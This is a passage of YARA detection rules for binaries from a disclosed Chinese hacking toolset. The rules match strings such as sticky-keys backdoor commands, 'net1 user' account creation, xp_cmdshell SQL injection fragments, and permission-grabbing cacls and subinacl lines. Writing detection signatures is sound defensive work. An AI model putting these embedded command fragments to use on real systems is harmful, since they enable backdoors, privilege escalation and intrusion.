      $s4 = "-tran   <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
      $s5 = "[+] Start Transmit (%s:%d <-> %s:%d) ......" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 1 of them
} 

rule CN_Honker_PostgreSQL_RID2E9B : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file PostgreSQL.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:21:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "&http://192.168.16.186/details.php?id=1" fullword ascii
      $s2 = "PostgreSQL_inject" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them
} 

rule CN_Honker_WebRobot_RID2DEB : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file WebRobot.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:52:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%d-%02d-%02d %02d^%02d^%02d ScanReprot.htm" fullword ascii
      $s2 = "\\log\\ProgramDataFile.dat" fullword ascii
      $s3 = "\\data\\FilterKeyword.txt" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them
} 

rule CN_Honker_Baidu_Extractor_Ver1_0_RID3313 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Baidu_Extractor_Ver1.0.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:32:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "\\Users\\Admin" fullword wide
      $s11 = "soso.com" fullword wide
      $s12 = "baidu.com" fullword wide
      $s19 = "cmd /c ping " fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them
} 

rule CN_Honker_FTP_scanning_RID2F61 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file FTP_scanning.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:54:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "CNotSupportedE" fullword ascii
      $s2 = "nINet.dll" fullword ascii
      $s9 = "?=MODULE" fullword ascii
      $s13 = "MSIE 6*" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 550KB and all of them
} 

rule CN_Honker_dirdown_dirdown_RID3114 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file dirdown.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:07:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\Decompress\\obj\\Release\\Decompress.pdb" fullword ascii
      $s1 = "Decompress.exe" fullword wide
      $s5 = "Get8Bytes" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 45KB and all of them
} 

rule CN_Honker_Xiaokui_conversion_tool_RID3463 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Xiaokui_conversion_tool.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:28:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "update [dv_user] set usergroupid=1 where userid=2;--" fullword ascii
      $s2 = "To.exe" fullword wide
      $s3 = "by zj1244" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 240KB and 2 of them
} 

rule CN_Honker_GroupPolicyRemover_RID3224 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file GroupPolicyRemover.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:52:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "GP_killer.EXE" fullword wide
      $s1 = "GP_killer Microsoft " fullword wide
      $s2 = "SHDeleteKeyA" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and all of them
} 

rule CN_Honker_WordpressScanner_RID315A : CHINA DEMO EXE FILE HKTL T1076 T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file WordpressScanner.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:18:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1076, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii
      $s1 = "(http://www.eyuyan.com)" fullword wide
      $s2 = "GetConnectString" fullword ascii
      $s4 = "#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them
} 

rule CN_Honker_Htran_V2_40_htran20_RID314C : CHINA DEMO EXE FILE HKTL T1020 T1090 T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file htran20.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:16:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1020, T1090, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%s -slave  ConnectHost ConnectPort TransmitHost TransmitPort" fullword ascii
      $s2 = "Enter Your Socks Type No: [0.BindPort 1.ConnectBack 2.Listen]:" fullword ascii
      $s3 = "[SERVER]connection to %s:%d error" fullword ascii
      $s4 = "%s -connect ConnectHost [ConnectPort]       Default:%d" fullword ascii
      $s5 = "[+] got, ip:%s, port:%d" fullword ascii
      $s6 = "[-] There is a error...Create a new connection." fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them
} 

rule CN_Honker_DictionaryGenerator_RID3284 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file DictionaryGenerator.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:08:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "`PasswordBuilder" fullword ascii
      $s2 = "cracker" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3650KB and all of them
} 

rule CN_Honker_ms11080_withcmd_RID2FF0 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file ms11080_withcmd.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:18:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Usage : ms11-080.exe cmd.exe Command " fullword ascii
      $s3 = "[>] create pipe error" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 340KB and all of them
} 

rule CN_Honker_T00ls_Lpk_Sethc_v2_RID313D : CHINA DEMO EXE FILE HKTL T1015 T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file T00ls Lpk Sethc v2.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:14:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1015, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "LOADER ERROR" fullword ascii
      $s2 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
      $s3 = "2011-2012 T00LS&RICES" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them
} 

rule CN_Honker_HASH_32_RID2CAF : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file 32.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 09:59:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "[Undefined OS version]  Major: %d Minor: %d" fullword ascii
      $s8 = "Try To Run As Administrator ..." fullword ascii
      $s9 = "Specific LUID NOT found" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 240KB and all of them
} 

rule CN_Honker_windows_mstsc_enhanced_RMDSTC_RID361C : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file RMDSTC.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 16:41:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "zava zir5@163.com" fullword wide
      $s1 = "By newccc" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them
} 

rule CN_Honker_sig_3389_mstsc_MSTSCAX_RID324B : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file MSTSCAX.DLL"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:59:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ResetPasswordWWWx" fullword ascii
      $s2 = "Terminal Server Redirected Printer Doc" fullword wide
      $s3 = "Cleaning temp directory" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them
} 

rule CN_Honker_T00ls_scanner_RID2FA3 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file T00ls_scanner.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:05:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "http://cn.bing.com/search?first=1&count=50&q=ip:" fullword wide
      $s17 = "Team:www.t00ls.net" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 330KB and all of them
} 

rule CN_Honker_GetHashes_RID2E43 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file GetHashes.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:07:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "SAM\\Domains\\Account\\Users\\Names registry hive reading error!" fullword ascii
      $s1 = "GetHashes <SAM registry file> [System key file]" fullword ascii
      $s2 = "Note: Windows registry file shall begin from 'regf' signature!" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 87KB and 2 of them
} 

rule CN_Honker_hashq_Hashq_RID2F30 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Hashq.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:46:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Hashq.exe" fullword wide
      $s5 = "CnCert.Net" fullword wide
      $s6 = "Md5 query tool" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them
} 

rule CN_Honker_ShiftBackdoor_Server_RID32C0 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Server.dat"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:18:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "del /q /f %systemroot%system32sethc.exe" fullword ascii
      $s1 = "cacls %s /t /c /e /r administrators" fullword ascii
      $s2 = "\\dllcache\\sethc.exe" fullword ascii
      $s3 = "\\ntvdm.exe" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them
} 

rule CN_Honker_exp_win2003_RID2E86 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file win2003.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:18:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Usage:system_exp.exe \"cmd\"" fullword ascii
      $s2 = "The shell \"cmd\" success!" fullword ascii
      $s4 = "Not Windows NT family OS." fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them
} 

rule CN_Honker_Interception3389_setup_RID3322 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file setup.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:34:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\%s" fullword ascii
      $s1 = "%s\\temp\\temp%d.bat" fullword ascii
      $s5 = "EventStartShell" fullword ascii
      $s6 = "del /f /q \"%s\"" fullword ascii
      $s7 = "\\wminotify.dll" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them
} 

rule CN_Honker_CnCerT_CCdoor_CMD_2_RID3143 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file CnCerT.CCdoor.CMD.dll2"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:15:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "cmd.dll" fullword wide
      $s1 = "cmdpath" fullword ascii
      $s2 = "Get4Bytes" fullword ascii
      $s3 = "ExcuteCmd" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 22KB and all of them
} 

rule CN_Honker_exp_ms11046_RID2E4F : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file ms11046.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:09:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "[*] Token system command" fullword ascii
      $s1 = "[*] command add user 90sec 90sec" fullword ascii
      $s2 = "[*] Add to Administrators success" fullword ascii
      $s3 = "Program: %s%s%s%s%s%s%s%s%s%s%s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them
} 

rule CN_Honker_Master_beta_1_7_RID3054 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Master_beta_1.7.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:35:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "http://seo.chinaz.com/?host=" fullword ascii
      $s2 = "Location: getpass.asp?info=" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 312KB and all of them
} 

rule CN_Honker_F4ck_Team_f4ck_2_RID304D : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file f4ck_2.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:34:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "F4ck.exe" fullword wide
      $s2 = "@Netapi32.dll" fullword ascii
      $s3 = "Team.F4ck.Net" fullword wide
      $s8 = "Administrators" fullword ascii
      $s9 = "F4ck Team" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 220KB and 2 of them
} 

rule CN_Honker_sig_3389_80_AntiFW_RID308F : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file AntiFW.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:45:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Set TS to port:80 Successfully!" fullword ascii
      $s2 = "Now,set TS to port 80" fullword ascii
      $s3 = "echo. >>amethyst.reg" fullword ascii
      $s4 = "del amethyst.reg" fullword ascii
      $s5 = "AntiFW.cpp" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 2 of them
} 

rule CN_Honker_wwwscan_gui_RID2F75 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file wwwscan_gui.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:58:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%s www.target.com -p 8080 -m 10 -t 16" fullword ascii
      $s2 = "/eye2007Admin_login.aspx" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 280KB and all of them
} 

rule CN_Honker_SwordCollEdition_RID312C : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file SwordCollEdition.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:11:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "YuJianScan.exe" fullword wide
      $s1 = "YuJianScan" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 225KB and all of them
} 

rule CN_Honker_HconSTFportable_RID3095 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file HconSTFportable.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:46:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "HconSTFportable.exe" fullword wide
      $s2 = "www.Hcon.in" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 354KB and all of them
} 

rule CN_Honker_T00ls_Lpk_Sethc_v3_LPK_RID3284 : CHINA DEMO EXE FILE HKTL T1015 T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file LPK.DAT"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:08:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1015, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "FreeHostKillexe.exe" fullword ascii
      $s2 = "\\sethc.exe /G everyone:F" fullword ascii
      $s3 = "c:\\1.exe" fullword ascii
      $s4 = "Set user Group Error! Username:" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them
} 

rule CN_Honker_Without_a_trace_Wywz_RID3309 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Wywz.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:30:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\Symantec\\Norton Personal Firewall\\Log\\Content.log" fullword ascii
      $s2 = "UpdateFile=d:\\tool\\config.ini,Option\\\\proxyIp=127.0.0.1\\r\\nproxyPort=808" ascii
      $s3 = "%s\\subinacl.exe /subkeyreg \"%s\" /Grant=%s=f /Grant=everyone=f" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1800KB and all of them
} 

rule CN_Honker_LPK2_0_LPK_RID2DB5 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file LPK.DAT"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:43:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\sethc.exe /G everyone:F" fullword ascii
      $s2 = "net1 user guest guest123!@#" fullword ascii
      $s3 = "\\dllcache\\sethc.exe" fullword ascii
      $s4 = "sathc.exe 211" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1030KB and all of them
} 

rule CN_Honker_cleaniis_RID2E0F : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file cleaniis.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:58:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "iisantidote <logfile dir> <ip or string to hide>" fullword ascii
      $s4 = "IIS log file cleaner by Scurt" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them
} 

rule CN_Honker_arp3_7_arp3_7_RID2F3E : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file arp3.7.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:48:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "CnCerT.Net.SKiller.exe" fullword wide
      $s2 = "www.80sec.com" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and all of them
} 

rule CN_Honker_exp_ms11080_RID2E4D : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file ms11080.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:08:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "[*] command add user 90sec 90sec" fullword ascii
      $s6 = "[*] Add to Administrators success" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 840KB and all of them
} 

rule CN_Honker_Injection_transit_RID31CE : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Injection_transit.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:38:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<description>Your app description here</description> " fullword ascii
      $s4 = "Copyright (C) 2003 ZYDSoft Corp." fullword wide
      $s5 = "ScriptnackgBun" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3175KB and all of them
} 

rule CN_Honker_Safe3WVS_RID2D79 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Safe3WVS.EXE"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:33:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "2TerminateProcess" fullword ascii
      $s1 = "mscoreei.dll" fullword ascii
      $s7 = "SafeVS.exe" fullword wide
      $s8 = "www.safe3.com.cn" fullword wide
      $s20 = "SOFTWARE\\Classes\\Interface\\" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them
} 

rule CN_Honker_NBSI_3_0_RID2D14 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file NBSI 3.0.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:16:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ";use master declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamet" wide
      $s2 = "http://localhost/1.asp?id=16" fullword ascii
      $s3 = " exec master.dbo.xp_cmdshell @Z--" fullword wide
      $s4 = ";use master declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamet" wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2600KB and 2 of them
} 

rule CN_Honker_sig_3389_DUBrute_v3_0_RC3_2_0_RID3418 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file 2.0.exe"
      author = "Florian Roth"
